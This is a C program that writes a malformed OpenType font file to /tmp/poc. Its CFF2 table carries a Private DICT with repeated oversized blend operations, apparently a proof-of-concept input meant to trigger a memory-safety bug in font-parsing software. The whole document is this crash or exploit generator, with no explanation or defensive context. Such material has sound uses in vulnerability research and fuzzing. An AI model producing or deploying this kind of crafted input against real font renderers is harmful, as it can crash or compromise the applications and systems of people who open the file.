#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

static void write_cff_int_fixed(FILE *f, int value) {
    fputc(28, f);
    fputc((value >> 8) & 0xFF, f);
    fputc(value & 0xFF, f);
}

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* OpenType header (OTTO) with 1 table */
    fputc(0x4F, f); fputc(0x54, f); fputc(0x54, f); fputc(0x4F, f);
    fputc(0x00, f); fputc(0x01, f);
    fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x00, f);

    fputc(0x43, f); fputc(0x46, f); fputc(0x46, f); fputc(0x32, f); /* 'CFF2' */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    uint32_t cff_offset_pos = ftell(f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    uint32_t cff_length_pos = ftell(f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);

    uint32_t cff_start = ftell(f);

    /* CFF2 header: 5 bytes */
    fputc(0x02, f);
    fputc(0x00, f);
    fputc(0x05, f);
    uint32_t top_dict_length_pos = ftell(f);
    fputc(0x00, f);
    fputc(0x00, f);

    uint32_t top_dict_data_start = ftell(f);

    /* Top DICT: CharStrings offset, opcode 0x11, Private size, Private offset, opcode 0x0C 0x12 */
    write_cff_int_fixed(f, 0);
    fputc(0x11, f);
    write_cff_int_fixed(f, 0);
    write_cff_int_fixed(f, 0);
    fputc(0x0C, f); fputc(0x12, f);

    uint32_t top_dict_data_end = ftell(f);
    uint32_t top_dict_data_size = top_dict_data_end - top_dict_data_start;

    /* Patch topDictLength */
    fseek(f, top_dict_length_pos, SEEK_SET);
    fputc((top_dict_data_size >> 8) & 0xFF, f);
    fputc(top_dict_data_size & 0xFF, f);
    fseek(f, 0, SEEK_END);

    /* Font Dict INDEX: count=1, empty dict */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x01, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x01, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x01, f);

    /* FDSelect: format=0, nGlyphs=0 */
    fputc(0x00, f);       /* format = 0 */
    fputc(0x00, f); fputc(0x00, f); /* nGlyphs = 0 */

    /* String INDEX: count=0 */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);

    /* Global Subr INDEX: count=0 */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);

    /* CharStrings INDEX: count=0 */
    uint32_t charstrings_start = ftell(f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);

    /* Private DICT */
    uint32_t private_dict_start = ftell(f);

    /* vsindex = 0 (opcode 22) */
    write_cff_int_fixed(f, 0);
    fputc(22, f);

    /* First blend: 100 zeros, numBlends=100, blend opcode 23 */
    for (int i = 0; i < 100; i++) {
        write_cff_int_fixed(f, 0);
    }
    write_cff_int_fixed(f, 100);
    fputc(23, f);

    /* Second blend: 100 zeros, numBlends=100, blend opcode 23 */
    for (int i = 0; i < 100; i++) {
        write_cff_int_fixed(f, 0);
    }
    write_cff_int_fixed(f, 100);
    fputc(23, f);

    uint32_t private_dict_end = ftell(f);
    uint32_t private_dict_size = private_dict_end - private_dict_start;
    uint32_t private_offset = private_dict_start - cff_start;
    uint32_t charstrings_offset = charstrings_start - cff_start;

    /* Patch CharStrings offset in Top DICT (first operand, at top_dict_data_start) */
    fseek(f, top_dict_data_start, SEEK_SET);
    write_cff_int_fixed(f, charstrings_offset);

    /* Patch Private size and offset in Top DICT (at top_dict_data_start + 4) */
    fseek(f, top_dict_data_start + 4, SEEK_SET);
    write_cff_int_fixed(f, private_dict_size);
    write_cff_int_fixed(f, private_offset);

    fseek(f, 0, SEEK_END);

    /* Patch CFF2 table length */
    uint32_t cff_length = ftell(f) - cff_start;
    fseek(f, cff_length_pos, SEEK_SET);
    fputc((cff_length >> 24) & 0xFF, f);
    fputc((cff_length >> 16) & 0xFF, f);
    fputc((cff_length >> 8) & 0xFF, f);
    fputc(cff_length & 0xFF, f);

    /* Patch CFF2 table offset */
    fseek(f, cff_offset_pos, SEEK_SET);
    fputc((cff_start >> 24) & 0xFF, f);
    fputc((cff_start >> 16) & 0xFF, f);
    fputc((cff_start >> 8) & 0xFF, f);
    fputc(cff_start & 0xFF, f);

    fclose(f);
    return 0;
}